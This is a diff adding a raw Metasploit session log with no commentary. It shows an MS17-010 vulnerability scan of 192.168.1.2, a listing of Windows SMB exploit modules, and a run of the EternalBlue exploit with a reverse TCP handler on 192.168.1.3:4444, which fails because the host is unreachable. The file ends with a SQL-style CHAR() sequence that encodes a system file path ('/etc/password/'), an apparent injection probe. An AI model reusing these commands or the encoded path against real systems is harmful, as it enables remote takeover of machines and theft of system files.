@@ -1,0 +1,152 @@
+  dB'dB'dB' dBBP     dBP     dBP BB
+   dB'dB'dB' dBP      dBP     dBP  BB
+  dB'dB'dB' dBBBBP   dBP     dBBBBBBB
+
+                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
+          .                  .                  dB' dBP    dB'.BP
+                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
+                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
+                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP
+
+                                                                    .
+                .
+        o                  To boldly go where no
+                            shell has gone before
+
+
+       =[ metasploit v4.16.8-dev                          ]
++ -- --=[ 1684 exploits - 964 auxiliary - 299 post        ]
++ -- --=[ 498 payloads - 40 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf > use auxiliary/scanner/smb/smb_ms17_010
+msf auxiliary(smb_ms17_010) > set RHOSTS 192.168.1.2
+RHOSTS => 192.168.1.2
+msf auxiliary(smb_ms17_010) > run
+
+[+] 192.168.1.2:445       - Host is likely VULNERABLE to MS17-010!  (Windows 5.1)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(smb_ms17_010) > back
+msf > use exploit/windows/smb/smb_ms17_010_etarnalblue
+[-] Failed to load module: exploit/windows/smb/smb_ms17_010_etarnalblue
+msf > use exploit/windows/smb/smb_ms17_010_eternalblue
+[-] Failed to load module: exploit/windows/smb/smb_ms17_010_eternalblue
+msf > use exploit/windows/smb/
+[-] Failed to load module: exploit/windows/smb/
+msf > search exploit/windows/smb/
+[!] Module database cache not built yet, using slow search
+
+Matching Modules
+================
+
+   Name                                                    Disclosure Date  Rank       Description
+   ----                                                    ---------------  ----       -----------
+   exploit/windows/smb/generic_smb_dll_injection           2015-03-04       manual     Generic DLL Injection From Shared Resource
+   exploit/windows/smb/group_policy_startup                2015-01-26       manual     Group Policy Script Execution From Shared Resource
+   exploit/windows/smb/ipass_pipe_exec                     2015-01-21       excellent  IPass Control Pipe Remote Command Execution
+   exploit/windows/smb/ms03_049_netapi                     2003-11-11       good       MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
+   exploit/windows/smb/ms04_007_killbill                   2004-02-10       low        MS04-007 Microsoft ASN.1 Library Bitstring Heap Overflow
+   exploit/windows/smb/ms04_011_lsass                      2004-04-13       good       MS04-011 Microsoft LSASS Service DsRolerUpgradeDownlevelServer Overflow
+   exploit/windows/smb/ms04_031_netdde                     2004-10-12       good       MS04-031 Microsoft NetDDE Service Overflow
+   exploit/windows/smb/ms05_039_pnp                        2005-08-09       good       MS05-039 Microsoft Plug and Play Service Overflow
+   exploit/windows/smb/ms06_025_rasmans_reg                2006-06-13       good       MS06-025 Microsoft RRAS Service RASMAN Registry Overflow
+   exploit/windows/smb/ms06_025_rras                       2006-06-13       average    MS06-025 Microsoft RRAS Service Overflow
+   exploit/windows/smb/ms06_040_netapi                     2006-08-08       good       MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
+   exploit/windows/smb/ms06_066_nwapi                      2006-11-14       good       MS06-066 Microsoft Services nwapi32.dll Module Exploit
+   exploit/windows/smb/ms06_066_nwwks                      2006-11-14       good       MS06-066 Microsoft Services nwwks.dll Module Exploit
+   exploit/windows/smb/ms06_070_wkssvc                     2006-11-14       manual     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
+   exploit/windows/smb/ms07_029_msdns_zonename             2007-04-12       manual     MS07-029 Microsoft DNS RPC Service extractQuotedChar() Overflow (SMB)
+   exploit/windows/smb/ms08_067_netapi                     2008-10-28       great      MS08-067 Microsoft Server Service Relative Path Stack Corruption
+   exploit/windows/smb/ms09_050_smb2_negotiate_func_index  2009-09-07       good       MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
+   exploit/windows/smb/ms10_046_shortcut_icon_dllloader    2010-07-16       excellent  Microsoft Windows Shell LNK Code Execution
+   exploit/windows/smb/ms10_061_spoolss                    2010-09-14       excellent  MS10-061 Microsoft Print Spooler Service Impersonation Vulnerability
+   exploit/windows/smb/ms15_020_shortcut_icon_dllloader    2015-03-10       excellent  Microsoft Windows Shell LNK Code Execution
+   exploit/windows/smb/ms17_010_eternalblue                2017-03-14       average    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   exploit/windows/smb/netidentity_xtierrpcpipe            2009-04-06       great      Novell NetIdentity Agent XTIERRPCPIPE Named Pipe Buffer Overflow
+   exploit/windows/smb/psexec                              1999-01-01       manual     Microsoft Windows Authenticated User Code Execution
+   exploit/windows/smb/psexec_psh                          1999-01-01       manual     Microsoft Windows Authenticated Powershell Command Execution
+   exploit/windows/smb/smb_delivery                        2016-07-26       excellent  SMB Delivery
+   exploit/windows/smb/smb_relay                           2001-03-31       excellent  MS08-068 Microsoft Windows SMB Relay Code Execution
+   exploit/windows/smb/timbuktu_plughntcommand_bof         2009-06-25       great      Timbuktu PlughNTCommand Named Pipe Buffer Overflow
+
+
+msf > use exploit/windows/smb/smb_delivery
+msf exploit(smb_delivery) > show options
+
+Module options (exploit/windows/smb/smb_delivery):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   FILE_NAME    test.dll         no        DLL file name
+   FOLDER_NAME                   no        Folder name to share (Default none)
+   SHARE                         no        Share (Default Random)
+   SRVHOST      0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT      445              yes       The local port to listen on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   DLL
+
+
+msf exploit(smb_delivery) > exit
+root@localhost:~# msfconsole
+                                                  
+ _                                                    _
+/ \    /\         __                         _   __  /_/ __
+| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
+| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
+|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
+      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\
+
+
+       =[ metasploit v4.16.8-dev                          ]
++ -- --=[ 1684 exploits - 964 auxiliary - 299 post        ]
++ -- --=[ 498 payloads - 40 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf > use exploit/windows/smb/ms17_010_eternalblue
+msf exploit(ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name                Current Setting  Required  Description
+   ----                ---------------  --------  -----------
+   GroomAllocations    12               yes       Initial number of times to groom the kernel pool.
+   GroomDelta          5                yes       The amount to increase the groom count by per try.
+   MaxExploitAttempts  3                yes       The number of times to retry the exploit.
+   ProcessName         spoolsv.exe      yes       Process to inject payload into.
+   RHOST                                yes       The target address
+   RPORT               445              yes       The target port (TCP)
+   SMBDomain           .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                              no        (Optional) The password for the specified username
+   SMBUser                              no        (Optional) The username to authenticate as
+   VerifyArch          true             yes       Check if remote architecture matches exploit Target.
+   VerifyTarget        true             yes       Check if remote OS matches exploit Target.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+
+msf exploit(ms17_010_eternalblue) > use exploit/windows/smb/smb_ms17_010_eternalblueInterrupt: use the 'exit' command to quit
+msf exploit(ms17_010_eternalblue) > set RHOST 192.168.1.2
+RHOST => 192.168.1.2
+msf exploit(ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 192.168.1.3:4444 
+[*] 192.168.1.2:445 - Connecting to target for exploitation.
+[-] 192.168.1.2:445 - Rex::HostUnreachable: The host (192.168.1.2:445) was unreachable.
+[*] Exploit completed, but no session was created.
+msf exploit(ms17_010_eternalblue) > exit
+root@localhost:~# 
+
+
+CHAR(47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 111, 114, 100, 47)
+
